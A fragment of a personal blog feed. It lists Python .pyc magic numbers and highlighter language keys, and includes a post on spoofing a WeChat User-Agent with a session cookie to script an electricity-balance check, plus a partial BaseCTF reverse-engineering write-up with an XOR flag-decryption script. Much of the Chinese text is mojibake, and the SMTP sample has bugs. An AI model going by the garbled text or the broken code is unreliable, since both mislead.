    <url>/2024/09/15/pythonticke/</url>
    
    <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enum PycMagic &#123;<br>    MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br>    MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, /* Also covers <span class="hljs-number">1.2</span> */<br>    MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br>    MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br>    MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br>    MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> <br>    MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br>    MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br>    MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br>    MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br>    MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br>    MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br>    MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br>    MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> <br>    MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br>    MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br>    MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br>    MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br>    MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br>    MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br>    MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br>    MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br>    MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br>    MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br>    MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br>    MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br>    MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span>,<br>    MAGIC_3_12 = <span class="hljs-number">0x0A0D0DCB</span>,<br> <br>    INVALID = <span class="hljs-number">0</span>,<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdownè¯­æ³•</title>
    <link href="/2024/09/14/markdown%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/09/14/markdown%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">languagekey1C1cActionScriptactionscriptApacheapacheAppleScriptapplescriptAsciiDocasciidocAspectJasciidocAutoHotkeyautohotkeyAVR AssembleravrasmAxaptaaxaptaBashbashBrainFuckbrainfuckCapâ€™n ProtocapnprotoClojure REPLclojureClojureclojureCMakecmakeCoffeeScriptcoffeescriptC++cppC#csCSScssDdDartdDelphidelphiDiffdiffDjangodjangoDOS.batdosDustdustElixirelixirERB(Embedded Ruby)erbErlang REPLerlang-replErlangerlangFIXfixF#fsharpG-code(ISO 6983)gcodeGherkingherkinGLSLglslGogoGradlegradleGroovygroovyHamlhamlHandlebarshandlebarsHaskellhaskellHaxehaxeHTMLhtmlHTTPhttpIni fileiniJavajavaJavaScriptjavascriptJSONjsonLassolassoLesslessLisplispLiveCodelivecodeserverLiveScriptlivescriptLualuaMakefilemakefileMarkdownmarkdownMathematicamathematicaMatlabmatlabMEL (Maya Embedded Language)melMercurymercuryMizarmizarMonkeymonkeyNginxnginxNimrodnimrodNixnixNSISnsisObjective CobjectivecOCamlocamlOxygeneoxygeneParser 3parser3PerlperlPHPphpPowerShellpowershellProcessingprocessingPythonâ€™s profiler outputprofileProtocol BuffersprotobufPuppetpuppetPythonpythonQqRrRenderMan RIBribRoboconfroboconfRenderMan RSLrslRubyrubyOracle Rules LanguageruleslanguageRustrustScalascalaSchemeschemeScilabscilabSCSSscssSmalismaliSmallTalksmalltalkSMLsmlSQLsqlStatastataSTEP Part21(ISO 10303-21)step21StylusstylusSwiftswiftTcltclTextextexttext/plainThriftthriftTwigtwigTypeScripttypescriptValavalaVB.NETvbnetVBScript in HTMLvbscript-htmlVBScriptvbscriptVerilogverilogVHDLvhdlVim ScriptvimIntel x86 Assemblyx86asmXLxlXMLxmlYAMLyml</code></pre>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çˆ¬è™«åˆè¯†</title>
    <link href="/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºå¯å®¤è€æ˜¯æ²¡ç”µå¯¼è‡´æˆ‘çš„ç”µè„‘å¤„äºå·¥ä½œçŠ¶æ€å¼€æœºï¼Œæ°”æ­»æˆ‘äº†ï¼Œæˆ‘ä¾¿æƒ³ç”¨pythonæ¥äº†è§£ç›®å‰çš„ç”µè´¹æ˜¯å¤šå°‘å¹¶ç»™æˆ‘å‘é‚®ä»¶ï¼Œé¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä¸€ä¸‹åŸºæœ¬çš„pythonå‘é€å“åº”åŒ…çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># å‘é€ GET è¯·æ±‚</span><br>url = <span class="hljs-string">&#x27;https://example.com&#x27;</span>  <span class="hljs-comment"># å°†æ­¤æ›¿æ¢ä¸ºä½ è¦è®¿é—®çš„ç½‘å€</span><br>response = requests.get(url)<br><br><span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-comment"># è·å–ç½‘é¡µå†…å®¹</span><br>    content = response.text  <span class="hljs-comment"># è¿”å›HTMLå†…å®¹</span><br>    <span class="hljs-built_in">print</span>(content)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># å‘é€ POST è¯·æ±‚</span><br>url = <span class="hljs-string">&#x27;https://example.com/api&#x27;</span>  <span class="hljs-comment"># å°†æ­¤æ›¿æ¢ä¸ºå®é™…çš„API URL</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;your_password&#x27;</span>&#125;  <span class="hljs-comment"># ä¼ é€’çš„æ•°æ®</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-comment"># è·å–å“åº”å†…å®¹</span><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨äº†è§£ä¹‹åæˆ‘ä»¬ç”¨bpæŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸å†å¾®ä¿¡ç¨‹åºæ—¶ç½‘é¡µä¼šæœ‰ä¸€ä¸ªè‡ªæ ¡éªŒçš„æƒ…å†µï¼Œè®©æˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­æ‰“å¼€ï¼Œè¿™æ— ç–‘æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›çš„ä¸è¿‡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬çš„è¯·æ±‚å¤´éƒ¨ä¼ªé€ æˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­çš„æƒ…æ™¯</p><p>è¿™æ˜¯åœ¨User agent ä¿®æ”¹ï¼Œè¿™æ ·æœåŠ¡ç«¯ä¾¿ä¼šè®¤ä¸ºæˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­äº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æˆ‘ä»¬çš„è¯·æ±‚æŠ¥æ–‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">POST /app/app/api/user/searchBindHouseListForMoney HTTP/1.1<br>Host: xdxfdf.xtu.edu.cn<br>Content-Length: 58<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: zh-CN<br>User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Origin: http://xdxfdf.xtu.edu.cn<br>Referer: http://xdxfdf.xtu.edu.cn/app/api/main/wxpay/payStepOne?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>Accept-Encoding: gzip, deflate, br<br>Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXX<br>Connection: keep-alive<br><br>wxId=XXXXXXXXXXXXXXXXXXX&amp;appId=XXXXXXXXXXXXXXXXXXXXXXX<br></code></pre></td></tr></table></figure><p>åœ¨pythonä¸­çš„å†™æ³•ä¾¿æ˜¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-comment"># è¯·æ±‚çš„ URL</span><br>url = <span class="hljs-string">&quot;https://xdxfdf.xtu.edu.cn/app/app/api/user/searchBindHouseListForMoney&quot;</span><br>headers = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=XXXXXXXXXXXXXXXXX&quot;</span>,<br>        &#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;wxId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>    <span class="hljs-string">&quot;appId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>&#125;<br>response = requests.post(url, headers=headers,data=data)<br><span class="hljs-comment"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å“åº”å†…å®¹:&quot;</span>, response.json())  <span class="hljs-comment"># å‡è®¾è¿”å›çš„å†…å®¹æ˜¯ JSON æ ¼å¼</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å“åº”å†…å®¹:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><p>å¯è§é‡è¦çš„å…¶å®æ˜¯cookie<br>æˆ‘ä»¬çš„å“åº”å†…å®¹æ˜¯(jsonè½¬ä¹‰åçš„)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;data&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;house_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;meter_status&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;sysId&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">64.18</span><span class="hljs-punctuation">,</span> &#x27;meter_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance_time&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">20240914225456</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;buy_time&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;free_balance&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">000017001111</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXXXXXXXXXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_customer_flag&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;msg&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27;<span class="hljs-punctuation">,</span> &#x27;ret&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–æˆ‘ä»¬è¦çš„æŠ¥æ–‡åæˆ‘ä»¬äº†è§£äº†åœ¨pythonä¸­å­˜åœ¨ä¸€ä¸ªäº¤SMTPçš„åº“ï¼Œè‡ªå¸¦çš„ç«Ÿç„¶æ˜¯,ç›´æ¥è´´ä½¿ç”¨ä»£ç ï¼Œçœ‹å¾—æ›´æ¸…æ¥šäº›</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header<br> <br><span class="hljs-comment"># ç¬¬ä¸‰æ–¹ SMTP æœåŠ¡</span><br>mail_host=<span class="hljs-string">&quot;smtp.XXX.com&quot;</span>  <span class="hljs-comment">#è®¾ç½®æœåŠ¡å™¨</span><br>mail_user=<span class="hljs-string">&quot;XXXX&quot;</span>    <span class="hljs-comment">#ç”¨æˆ·å</span><br>mail_pass=<span class="hljs-string">&quot;XXXXXX&quot;</span>   <span class="hljs-comment">#å£ä»¤ </span><br> <br> <br>sender = <span class="hljs-string">&#x27;from@runoob.com&#x27;</span><br>receivers = [<span class="hljs-string">&#x27;429240967@qq.com&#x27;</span>]  <span class="hljs-comment"># æ¥æ”¶é‚®ä»¶ï¼Œå¯è®¾ç½®ä¸ºä½ çš„QQé‚®ç®±æˆ–è€…å…¶ä»–é‚®ç®±</span><br> <br>message = MIMEText(<span class="hljs-string">&#x27;Python é‚®ä»¶å‘é€æµ‹è¯•...&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;From&#x27;</span>] = Header(<span class="hljs-string">&quot;èœé¸Ÿæ•™ç¨‹&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;To&#x27;</span>] =  Header(<span class="hljs-string">&quot;æµ‹è¯•&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br>subject = <span class="hljs-string">&#x27;Python SMTP é‚®ä»¶æµ‹è¯•&#x27;</span><br>message[<span class="hljs-string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br> <br><span class="hljs-keyword">try</span>:<br>    smtpObj = smtplib.SMTP() <br>    smtpObj.connect(smtp.qq.com, <span class="hljs-number">25</span>)    <span class="hljs-comment"># 25 ä¸º SMTPç«¯å£å· 456ä¸ºsshåŠ å¯†ç«¯å£å·</span><br>    smtpObj.login(mail_user,mail_pass)  <span class="hljs-comment">#ç”¨æˆ·çš„é‚®ç®±å·ï¼Œpassä¸æ˜¯å¯†ç æ˜¯SMTPæˆæƒå·ç </span><br>    smtpObj.sendmail(sender, receivers, message.as_string())<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;é‚®ä»¶å‘é€æˆåŠŸ&quot;</span><br><span class="hljs-keyword">except</span> smtplib.SMTPException:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error: æ— æ³•å‘é€é‚®ä»¶&quot;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å¼€å¯qqé‚®ç®±çš„smtpæœåŠ¡,äº†è§£äº†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023941.png" srcset="/img/loading.gif" lazyload><br>é¡ºä¾¿è´´ä¸€ä¸ªFromçš„æ ¼å¼æˆ‘åœ¨è¿™é‡Œå¡ä½äº†ã€‚ã€‚ã€‚é‚®ç®±æ ¼å¼è¦æ­£ç¡®å‘œå‘œå‘œ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023846.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crawler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF202409</title>
    <link href="/2024/09/14/BaseCTF202409/"/>
    <url>/2024/09/14/BaseCTF202409/</url>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>æ—¢ç„¶æ˜¯UPXé‚£å¿…é¡»å…ˆDIEæŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141119212.png" srcset="/img/loading.gif" lazyload><br>ä¸€çœ‹å°±ä¸å¯¹åŠ²ï¼Œupxæœ€å¤šåªè§è¿‡3.96çš„ï¼Œä¸è¿‡è¿™é‡Œå…ˆç”¨upxè‡ªå·±è„±ä¸€ä¸‹å¯ä»¥è„±<br>ç›´æ¥ç»§ç»­æŸ¥ï¼Œ64ä½æ— å£³ï¼Œè¿›å…¥ida<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141122619.png" srcset="/img/loading.gif" lazyload><br>æ˜æ˜¾çš„base64ç›´æ¥ï¼Œè§£å¯†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141123562.png" srcset="/img/loading.gif" lazyload><br>ç§’è§£<br>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>ç®€å•xorï¼Œç›´æ¥çœ‹idaï¼ŒæŸ¥ä½æ•°64ä½<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141128380.png" srcset="/img/loading.gif" lazyload><br>çœ‹ç äº†è§£ï¼Œå…³é”®å‡½æ•°keystreamå’Œencrptï¼Œè¾“å…¥é•¿åº¦ä¸º28ï¼Œstrã€v11ã€v12ã€v13åŠ èµ·æ¥æ­£å¥½28ä½,è¿™ä¸ªé¢˜ç›®è¦æ³¨æ„çš„å°±æ˜¯idaä¸­çš„cæ˜¯å°ç«¯åºçš„ä¼šæ‰€æœ‰çš„æ•°æ®éƒ½ä¼šåè½¬ï¼Œè€Œä¸”è®°å¾—ä½¿ç”¨åŸæ•°æ®ï¼Œä¸è¦ç”¨è½¬ä¹‰åçš„å®¹æ˜“å‡ºé”™<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141137462.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141138498.png" srcset="/img/loading.gif" lazyload><br>å†™pythonexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å®˜æ–¹wp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key</span>):<br>    key_box = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        key_box.append(key[i%<span class="hljs-number">3</span>] ^ i)<br>    <span class="hljs-keyword">return</span> key_box<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, key</span>):<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    key = key[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        flag += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i])<br>    <span class="hljs-keyword">return</span> flag<br><br>enc1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D0B2D2625050901&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;673D491E20317A24&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;34056E2E2508504D&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc4 = <span class="hljs-string">b&quot;\&quot;@;%&quot;</span><br>enc = enc1 + enc2 + enc3 + enc4<br><span class="hljs-built_in">print</span>(enc)<br><br>key = (<span class="hljs-number">7499608</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>key_box = key_stream(key)<br><span class="hljs-built_in">print</span>(key_box)<br><br>flag = decrypt(enc,key_box)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>ä»¥ä¸Šæ¥å°±æä¸ªbase64å•Šï¼Œæˆ‘æ„Ÿè§‰åƒï¼Œä½†æ˜¯æ²¡æœ‰ç¡®å®šï¼Œäºæ˜¯å°±çœ‹ä¸æ‡‚å‡½æ•°é‡Œé¢çš„å‡ ä¸ªå€¼ä¸ºä»€ä¹ˆæ²¡æœ‰æ•°äº†ï¼Œè¿™ä¹ˆå¥‡æ€ªï¼Œæœç„¶è¿˜æ˜¯æ²¡æœ‰å­¦è¿‡ï¼Œä¸è¿‡è¿™æ¬¡å¥½å¥½åˆ†æäº†ä¸€ç•ªä¸‹æ¬¡åº”è¯¥å°±å¯ä»¥ç¬é—´ç§’æ€äº†ï¼Œçœ‹é¢˜<br><img 